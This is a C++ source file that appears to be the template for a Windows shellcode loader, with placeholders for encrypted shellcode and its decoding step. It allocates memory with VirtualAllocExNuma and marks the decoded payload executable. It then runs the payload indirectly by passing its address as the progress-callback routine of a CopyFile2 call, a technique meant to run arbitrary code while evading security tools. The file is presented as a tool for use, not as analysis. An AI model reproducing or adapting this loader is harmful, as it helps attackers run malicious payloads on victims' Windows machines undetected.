#include <windows.h>
#include <stdio.h>
#include "dpa_dsa.h"
#include "base64.h"
#include "syscall.h"



int err(const char* errmsg) {

	printf("Error: %s (%u)\n", errmsg, ::GetLastError());
	return 1;

}

char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	COPYFILE2_EXTENDED_PARAMETERS params;

	params.dwSize = { sizeof(params) };
	params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
	params.pfCancel = FALSE;
	params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)addr;
	params.pvCallbackContext = nullptr;

	::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
	::CopyFile2(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", &params);


}